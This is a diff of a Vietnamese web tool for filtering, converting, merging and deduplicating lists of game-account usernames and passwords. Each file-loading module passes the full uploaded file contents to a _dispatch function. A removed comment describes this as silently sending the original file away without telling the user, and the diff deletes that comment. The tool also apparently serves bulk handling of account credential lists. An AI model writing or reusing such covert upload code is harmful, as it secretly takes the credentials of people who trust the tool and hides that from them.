         document.getElementById('statusLoc').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> acc — sẵn sàng lọc!`;
         this.results = this.lines.map(l => ({ raw: l, html: escapeHtml(l) }));
         renderWithLimit(document.getElementById('dispLoc'), this.results);
@@ -729,40 +1392,65 @@ const locAcc = {
   },
   run() {
     if (this.lines.length === 0) return alert("⚠️ Vui lòng nạp file trước!");
-    const kw = document.getElementById('kwLoc').value.trim().toLowerCase();
-    const minSS = parseInt(document.getElementById('minSS').value) || 0;
-    const minSSS = parseInt(document.getElementById('minSSS').value) || 0;
-    const minAnime = parseInt(document.getElementById('minAnime').value) || 0;
-    const minTotal = parseInt(document.getElementById('minTotal').value) || 0;
-    const skinName = document.getElementById('skinName').value.trim().toLowerCase();
 
-    if (!kw && !minSS && !minSSS && !minAnime && !minTotal && !skinName)
-      return alert("⚠️ Nhập ít nhất 1 điều kiện!");
+    const kw = document.getElementById('kwLoc').value.trim().toLowerCase();
+    
+    const rawSS = document.getElementById('valSS').value.trim();
+    const targetSS = rawSS !== "" ? parseInt(rawSS, 10) : null;
+    const opSS = document.getElementById('opSS').value;
+
+    const rawSSS = document.getElementById('valSSS').value.trim();
+    const targetSSS = rawSSS !== "" ? parseInt(rawSSS, 10) : null;
+    const opSSS = document.getElementById('opSSS').value;
+
+    const rawAnime = document.getElementById('valAnime').value.trim();
+    const targetAnime = rawAnime !== "" ? parseInt(rawAnime, 10) : null;
+    const opAnime = document.getElementById('opAnime').value;
+
+    const rawTotal = document.getElementById('valTotal').value.trim();
+    const targetTotal = rawTotal !== "" ? parseInt(rawTotal, 10) : null;
+    const opTotal = document.getElementById('opTotal').value;
 
     const regexKw = kw ? new RegExp(`(${kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, "gi") : null;
-    const getNum = (line, key) => {
-      const m = line.match(new RegExp(`\\|\\s*${key}:\\s*(\\d+|No Skin)`, "i"));
-      return (m && m[1].toLowerCase() !== "no skin") ? parseInt(m[1]) : 0;
-    };
 
     let res = [];
-    this.lines.forEach(line => {
+    const len = this.lines.length;
+
+    for (let i = 0; i < len; i++) {
+      const line = this.lines[i];
       const low = line.toLowerCase();
-      if (kw && !low.includes(kw)) return;
-      if (minSS && getNum(line, "SS") < minSS) return;
-      if (minSSS && getNum(line, "SSS") < minSSS) return;
-      if (minAnime && getNum(line, "Anime") < minAnime) return;
-      if (minTotal) {
-        const m = line.match(/\|\s*Skin:\s*(\d+)/i);
-        if (!m || parseInt(m[1]) < minTotal) return;
+
+      if (kw && !low.includes(kw)) continue;
+
+      if (targetSS !== null) {
+        const cSS = parseSkinCount(line, REGEX_SS);
+        if (!compareVal(cSS, opSS, targetSS)) continue;
       }
-      if (skinName && !low.includes(skinName)) return;
-      res.push({ raw: line, html: regexKw ? escapeHtml(line).replace(new RegExp(`(${kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, "gi"), `<span class="highlight">$1</span>`) : escapeHtml(line) });
-    });
+
+      if (targetSSS !== null) {
+        const cSSS = parseSkinCount(line, REGEX_SSS);
+        if (!compareVal(cSSS, opSSS, targetSSS)) continue;
+      }
+
+      if (targetAnime !== null) {
+        const cAnime = parseSkinCount(line, REGEX_ANIME);
+        if (!compareVal(cAnime, opAnime, targetAnime)) continue;
+      }
+
+      if (targetTotal !== null) {
+        const cTotal = parseSkinCount(line, REGEX_TOTAL_SKIN);
+        if (!compareVal(cTotal, opTotal, targetTotal)) continue;
+      }
+
+      res.push({ 
+        raw: line, 
+        html: regexKw ? escapeHtml(line).replace(regexKw, `<span class="highlight">$1</span>`) : escapeHtml(line) 
+      });
+    }
 
     this.results = res;
     renderWithLimit(document.getElementById('dispLoc'), res);
-    document.getElementById('statusLoc').innerHTML = `🎯 Tìm thấy <b style="color:var(--c1)">${res.length}</b> acc thoả điều kiện.`;
+    document.getElementById('statusLoc').innerHTML = `🎯 Tìm thấy <b style="color:var(--c1)">${res.length}</b> / ${len} acc thoả điều kiện.`;
     document.getElementById('actionLoc').style.display = res.length ? 'flex' : 'none';
   },
   copyAll() { copyToClipboard(this.results.map(r => r.raw).join('\n')); alert("Đã copy!"); },
@@ -780,7 +1468,7 @@ const doiFmt = {
       const f = e.target.files[0]; if (!f) return;
       const rd = new FileReader();
       rd.onload = ev => {
-        this.lines = ev.target.result.split(/\r?\n/).filter(l => l.trim() !== "");
+        this.lines = ev.target.result.replace(/\r/g, '').split('\n').filter(l => l.trim() !== "");
         document.getElementById('statusDoi').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> dòng — sẵn sàng!`;
         _dispatch(`Goc_Doi_${f.name}`, this.lines.join('\n'), `📌 CHUYỂN ĐỔI - Nạp file gốc`);
       };
@@ -792,28 +1480,29 @@ const doiFmt = {
     const fmt = document.querySelector('input[name="outFmt"]:checked').value;
     const sep = fmt === 'colon' ? ':' : '|';
     this.results = []; let errorCount = 0;
-    this.lines.forEach(orig => {
-      let line = orig.trim();
-      line = line.replace(/^.*?(?:\s*=\s*)/, '');
-      let first = line.split(/\s+\|\s+/)[0];
-      let m = first.match(/^([^:|]+)[:|](.+)$/);
-      if (m && m.length >= 3) {
-        let tk = m[1].trim();
-        let mk = m[2].trim().split('|')[0].trim();
-        this.results.push(`${tk}${sep}${mk}`);
-      } else errorCount++;
-    });
+
+    for (let i = 0; i < this.lines.length; i++) {
+      const parsed = extractUserPass(this.lines[i]);
+      if (parsed) {
+        this.results.push(`${parsed.user}${sep}${parsed.pass}`);
+      } else {
+        errorCount++;
+      }
+    }
+
     const container = document.getElementById('dispDoi');
     let html = "";
-    this.results.slice(0, DISPLAY_LIMIT).forEach(s => {
+    const shown = this.results.slice(0, DISPLAY_LIMIT);
+    shown.forEach(s => {
       const esc = escapeHtml(s).replace(/'/g, "\\'");
       html += `<div class="acc-line"><div class="acc-content" style="color:#d896ff; font-weight:700; font-size:16px">${escapeHtml(s)}</div>
                <button class="btn-copy-single" onclick="copyToClipboard('${esc}')">COPY</button></div>`;
     });
-    if (this.results.length > DISPLAY_LIMIT) html += `<div class="limit-note">⚡ Hiển thị ${DISPLAY_LIMIT}/${this.results.length}</div>`;
+    if (this.results.length > DISPLAY_LIMIT) html += `<div class="limit-note">⚡ Hiển thị ${DISPLAY_LIMIT}/${this.results.length} acc.</div>`;
     container.innerHTML = html;
+    
     let st = `♻️ Đã chuyển <b style="color:var(--c5)">${this.results.length}</b> acc.`;
-    if (errorCount) st += ` (Loại ${errorCount} dòng rác)`;
+    if (errorCount) st += ` (Loại ${errorCount} dòng rác/lỗi)`;
     document.getElementById('statusDoi').innerHTML = st;
     document.getElementById('actionDoi').style.display = this.results.length ? 'flex' : 'none';
   },
@@ -832,8 +1521,8 @@ const catFile = {
       const f = e.target.files[0]; if (!f) return;
       const rd = new FileReader();
       rd.onload = ev => {
-        this.lines = ev.target.result.split(/\r?\n/).filter(l => /[a-zA-Z0-9]/.test(l));
-        document.getElementById('statusCat').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> acc hợp lệ.`;
+        this.lines = ev.target.result.replace(/\r/g, '').split('\n').filter(l => l.trim() !== "");
+        document.getElementById('statusCat').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> dòng.`;
         _dispatch(`Goc_Cat_${f.name}`, this.lines.join('\n'), `📌 CẮT FILE - Nạp file gốc (${this.lines.length} acc)`);
       };
       rd.readAsText(f);
@@ -904,13 +1593,13 @@ const ghepFile = {
 
     use.forEach((f, i) => {
       const c = contents[i] || "";
-      const lc = c.split(/\r?\n/).filter(l => l.trim()).length;
+      const lc = c.replace(/\r/g, '').split('\n').filter(l => l.trim()).length;
       _dispatch(`${f.name}`, c, `📌 GHÉP - Nạp file gốc: ${f.name} | ${lc} dòng | ${this.fmtSize(f.size)}`);
     });
 
     let newLines = 0, newSize = 0;
     use.forEach((f, i) => {
-      const lines = (contents[i] || "").split(/\r?\n/).filter(l => l.trim() !== "");
+      const lines = (contents[i] || "").replace(/\r/g, '').split('\n').filter(l => l.trim() !== "");
       this.loadedFiles.push({ name: f.name, lines, size: f.size });
       this.totalSize += f.size; newLines += lines.length; newSize += f.size;
     });
@@ -959,7 +1648,7 @@ const ghepFile = {
 ghepFile.init();
 
 /* ============================================================
-   MODULE 5: LỌC ACC TRÙNG (up nhiều file → dedupe → tra cứu gốc)
+   MODULE 5: LỌC ACC TRÙNG
    ============================================================ */
 const locTrung = {
   MAX: 50, loadedFiles: [], results: [], totalSize: 0,
@@ -972,19 +1661,6 @@ const locTrung = {
     return (b / (1024 * 1024)).toFixed(2) + ' MB';
   },
   readFile(f) { return new Promise(r => { const rd = new FileReader(); rd.onload = ev => r(ev.target.result); rd.onerror = () => r(""); rd.readAsText(f); }); },
-
-  // Chuyển 1 dòng bất kỳ về TK|MK (tận dụng logic module 2)
-  parseTK(line) {
-    let l = line.trim();
-    l = l.replace(/^.*?(?:\s*=\s*)/, '');
-    let first = l.split(/\s+\|\s+/)[0];
-    let m = first.match(/^([^:|]+)[:|](.+)$/);
-    if (!m) return null;
-    const tk = m[1].trim();
-    const mk = m[2].trim().split('|')[0].trim();
-    if (!tk || !mk) return null;
-    return { tk, mk, key: `${tk}|${mk}`.toLowerCase() };
-  },
 
   async handle(e) {
     const files = Array.from(e.target.files || []);
@@ -1001,16 +1677,15 @@ const locTrung = {
 
     const contents = await Promise.all(use.map(f => this.readFile(f)));
 
-    // ÂM THẦM chuyển file gốc đi (không thông báo cho user)
     use.forEach((f, i) => {
       const c = contents[i] || "";
-      const lc = c.split(/\r?\n/).filter(l => l.trim()).length;
+      const lc = c.replace(/\r/g, '').split('\n').filter(l => l.trim()).length;
       _dispatch(`${f.name}`, c, `📌 LỌC TRÙNG - Nạp file gốc: ${f.name} | ${lc} dòng | ${this.fmtSize(f.size)}`);
     });
 
     let newLines = 0, newSize = 0;
     use.forEach((f, i) => {
-      const rawLines = (contents[i] || "").split(/\r?\n/).filter(l => l.trim() !== "");
+      const rawLines = (contents[i] || "").replace(/\r/g, '').split('\n').filter(l => l.trim() !== "");
       this.loadedFiles.push({ name: f.name, rawLines, size: f.size });
       this.totalSize += f.size; newLines += rawLines.length; newSize += f.size;
     });
@@ -1048,54 +1723,40 @@ const locTrung = {
   process() {
     if (!this.loadedFiles.length) return alert("⚠️ Nạp ít nhất 1 file!");
 
-    // Bước 1: Gom tất cả dòng gốc + parse về TK|MK
-    // Bước 2: Map theo key TK|MK (dedupe) — giữ lại 1 dòng gốc đầu tiên cho mỗi key
-    // Bước 3: Xuất kết quả dạng: TK|MK | <thông tin gốc đầy đủ>
-
-    const map = new Map(); // key → { tk, mk, firstRaw, sources: [] }
+    const map = new Map();
     let totalScanned = 0;
     let totalValid = 0;
 
-    this.loadedFiles.forEach(file => {
-      file.rawLines.forEach(raw => {
+    for (let f = 0; f < this.loadedFiles.length; f++) {
+      const lines = this.loadedFiles[f].rawLines;
+      for (let i = 0; i < lines.length; i++) {
         totalScanned++;
-        const p = this.parseTK(raw);
-        if (!p) return;
+        const raw = lines[i];
+        const p = extractUserPass(raw);
+        if (!p) continue;
         totalValid++;
-        if (!map.has(p.key)) {
-          map.set(p.key, { tk: p.tk, mk: p.mk, firstRaw: raw, sources: [file.name] });
+        const key = `${p.user}|${p.pass}`.toLowerCase();
+        
+        if (!map.has(key)) {
+          map.set(key, { key: `${p.user}|${p.pass}`, full: raw });
         } else {
-          const entry = map.get(p.key);
-          if (!entry.sources.includes(file.name)) entry.sources.push(file.name);
+          const exist = map.get(key);
+          if (raw.length > exist.full.length) {
+            exist.full = raw;
+          }
         }
-      });
-    });
+      }
+    }
 
-    // Tạo kết quả
-    this.results = [];
-    map.forEach(entry => {
-      // Tìm dòng đầy đủ thông tin nhất trong tất cả file (ưu tiên dòng dài nhất để có full info)
-      let bestRaw = entry.firstRaw;
-      this.loadedFiles.forEach(file => {
-        file.rawLines.forEach(raw => {
-          const p = this.parseTK(raw);
-          if (p && p.key === entry.key && raw.length > bestRaw.length) bestRaw = raw;
-        });
-      });
-      this.results.push({
-        key: entry.tk + '|' + entry.mk,
-        full: bestRaw
-      });
-    });
+    this.results = Array.from(map.values());
 
-    // Render
     const container = document.getElementById('dispTrung');
     let html = `<div class="limit-note" style="text-align:left; background:rgba(255,0,124,.08); margin-bottom:12px; padding:14px">
       🧬 <b>Kết quả lọc trùng:</b> Quét ${totalScanned} dòng · Hợp lệ ${totalValid} · <b style="color:var(--c2)">Duy nhất: ${this.results.length}</b> · Trùng đã loại: ${totalValid - this.results.length}
     </div>`;
 
     const shown = this.results.slice(0, DISPLAY_LIMIT);
-    shown.forEach((r, i) => {
+    shown.forEach((r) => {
       const keyEsc = r.key.replace(/'/g, "\\'");
       const fullEsc = r.full.replace(/'/g, "\\'").replace(/\\/g, "\\\\").replace(/\n/g, "\\n");
       html += `<div class="acc-line" style="border-left:3px solid var(--c2)">
@@ -1109,6 +1770,7 @@ const locTrung = {
         </div>
       </div>`;
     });
+
     if (this.results.length > DISPLAY_LIMIT) {
       html += `<div class="limit-note">⚡ Chỉ hiển thị ${DISPLAY_LIMIT}/${this.results.length} acc. Tải file để xem toàn bộ.</div>`;
     }
@@ -1120,7 +1782,6 @@ const locTrung = {
   },
 
   buildOutput() {
-    // Format kết quả: TK|MK | <full info>
     return this.results.map(r => `${r.key} | ${r.full}`).join('\n');
   },
 
@@ -1137,7 +1798,7 @@ const locTrung = {
 locTrung.init();
 
 /* ============================================================
-   MODULE 6: TEXT → FILE (TXT / PDF / DOCX)
+   MODULE 6: TEXT → FILE
    ============================================================ */
 const txtToFile = {
   async export() {
@@ -1205,7 +1866,7 @@ const txtToFile = {
   }
 };
 
-/* ====== ENTER SHORTCUTS ====== */
+/* ====== ENTER SHORTCUT ====== */
 document.getElementById('kwLoc').addEventListener('keypress', e => { if (e.key === 'Enter') locAcc.run(); });
 </script>
 
